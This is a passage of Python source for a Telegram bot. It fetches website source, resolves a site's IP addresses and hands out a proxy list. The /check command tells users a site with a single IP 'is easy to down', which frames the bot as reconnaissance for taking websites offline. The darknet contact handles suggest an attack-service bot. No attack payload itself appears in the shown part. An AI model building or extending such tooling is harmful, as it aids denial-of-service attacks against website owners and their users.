        bot.reply_to(message, '𝑦𝑜𝑢 𝑑𝑜𝑛𝑡 ℎ𝑎𝑣𝑒 𝑝𝑒𝑟𝑚𝑖𝑠𝑠𝑖𝑜𝑛 𝑡𝑜 𝑜𝑓𝑓 𝑡ℎ𝑒 𝑏𝑜𝑡.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, '𝑠𝑢𝑐𝑐𝑒𝑠𝑠𝑓𝑢𝑙 𝑜𝑓𝑓 𝑡ℎ𝑒 𝑏𝑜𝑡.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, '𝑦𝑜𝑢 𝑑𝑜𝑛𝑡 ℎ𝑎𝑣𝑒 𝑝𝑒𝑟𝑚𝑖𝑠𝑠𝑖𝑜𝑛 𝑡𝑜 𝑜𝑛 𝑡ℎ𝑒 𝑏𝑜𝑡.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, '𝑜𝑛 𝑏𝑜𝑡 𝑠𝑢𝑐𝑐𝑒𝑠𝑠𝑓𝑢𝑙')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, '𝑡ℎ𝑒 𝑏𝑜𝑡 𝑖𝑠 𝑐𝑢𝑟𝑟𝑒𝑛𝑡𝑙𝑦 𝑜𝑓𝑓𝑙𝑖𝑛𝑒 𝑐𝑜𝑛𝑡𝑎𝑐𝑡 @DarknetDdd. 𝑡𝑜 𝑔𝑒𝑡 𝑜𝑛')
        return
    
    
    if len(message.text.split()) != 2:
        bot.reply_to(message, '𝑝𝑙𝑒𝑎𝑠𝑒 𝑒𝑛𝑡𝑒𝑟 𝑐𝑜𝑟𝑟𝑒𝑥𝑡 𝑠𝑦𝑛𝑡𝑎𝑥.\n𝑓𝑜𝑟 𝑒𝑥𝑎𝑝𝑙𝑒 :/code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, ' 𝑡ℎ𝑒 𝑠𝑜𝑢𝑟𝑐𝑒 𝑐𝑜𝑑𝑒 𝑐𝑜𝑛𝑛𝑜𝑡 𝑏𝑒 𝑜𝑏𝑡𝑎𝑖𝑛𝑒𝑑 𝑓𝑟𝑜𝑚 𝑡ℎ𝑖𝑠 𝑤𝑒𝑏𝑠𝑖𝑡𝑒, 𝑝𝑙𝑒𝑎𝑠𝑒 𝑐ℎ𝑒𝑐𝑘 𝑎𝑔𝑎𝑖𝑛 𝑡ℎ𝑒 𝑢𝑟𝑙.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, '𝑡ℎ𝑒 𝑤𝑒𝑏𝑠𝑖𝑡𝑒 𝑖𝑠 𝑛𝑜𝑡 𝐻𝑇𝑀𝐿 𝑜𝑟 𝑃𝐻𝑃, 𝑝𝑙𝑒𝑎𝑠𝑒 𝑡𝑟𝑦 𝑎𝑔𝑎𝑖𝑛 𝑤𝑖𝑡ℎ 𝑎 𝑤𝑒𝑏𝑠𝑖𝑡𝑒 𝑈𝑅𝐿 𝑐𝑜𝑛𝑡𝑎𝑖𝑛𝑖𝑛𝑔 𝐻𝑇𝑀𝐿 𝑜𝑟 𝑃𝐻𝑃 𝑓𝑖𝑙𝑒𝑠.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_codeweb')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'𝑒𝑟𝑟𝑜𝑟: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, '𝑝𝑙𝑒𝑎𝑠𝑒 𝑒𝑛𝑡𝑒𝑟 𝑐𝑜𝑟𝑟𝑒𝑐𝑡 𝑓𝑜𝑟𝑚𝑎𝑡.\nFor example: /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Check if the URL has http/https, if not added
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Remove the "www" prefix if present
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"𝑖𝑝 𝑜𝑓 𝑡ℎ𝑒 𝑤𝑒𝑏𝑠𝑖𝑡𝑒: {url}\n𝑖𝑝: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "𝑤𝑒𝑏𝑠𝑖𝑡𝑒 𝑤𝑖𝑡ℎ 𝑜𝑛𝑒 𝑖𝑝 𝑖𝑠 𝑒𝑎𝑠𝑦 𝑡𝑜 𝑑𝑜𝑤𝑛."
        else:
            reply += "𝑤𝑒𝑏𝑠𝑖𝑡𝑒 𝑤𝑎𝑠 ℎ𝑎𝑟𝑑 𝑡𝑜 𝑑𝑜𝑤𝑛."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"𝑒𝑟𝑟𝑜𝑟{str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "𝑙𝑖𝑛𝑘: t.me/DarknetDdd")


# Function to calculate bot uptime
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, '𝐵𝑂𝑇 𝐻𝐴𝑆 𝐵𝐸𝐸𝑁 𝑂𝐹𝐹𝐿𝐼𝑁𝐸 𝑃𝐿𝐸𝐴𝑆𝐸 𝑊𝐴𝐼𝑇 𝑈𝑁𝑇𝐼𝐿 𝐼𝑇𝑆 𝑇𝑈𝑅𝑁 𝑂𝑁.')
        return

    try:
        with open("proxy.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'𝐵𝑂𝑇 𝐼𝑆 𝑈𝑃𝐷𝐴𝑇𝐼𝑁𝐺 𝑃𝑅𝑂𝑋𝑌 𝑃𝐿𝐸𝐴𝑆𝐸 𝑊𝐴𝐼𝑇... \nQuantity proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxy.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "𝑛𝑜𝑡 𝑓𝑜𝑢𝑛𝑑 𝑓𝑖𝑙𝑒 𝑝𝑟𝑜𝑥𝑦.𝑡𝑥𝑡.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} 𝐻𝑂𝑈𝑅𝑆, {minutes} minutes, {seconds} 𝑆𝐸𝐶𝑂𝑁𝐷𝑆'
    bot.reply_to(message, f'𝑏𝑜𝑡 ℎ𝑎𝑠 𝑏𝑒𝑒𝑛 𝑜𝑛 𝑖𝑛: {uptime_str} 𝑡𝑖𝑚𝑒')


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, '𝑖𝑛𝑣𝑎𝑙𝑖𝑑 𝑐𝑜𝑚𝑚𝑎𝑛𝑑 𝑝𝑙𝑒𝑎𝑠𝑒 𝑢𝑠𝑒 /help 𝑐𝑜𝑚𝑚𝑎𝑛𝑑 𝑡𝑜 𝑠𝑒𝑒 𝑐𝑜𝑚𝑚𝑎𝑛𝑑 𝑙𝑖𝑠𝑡.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
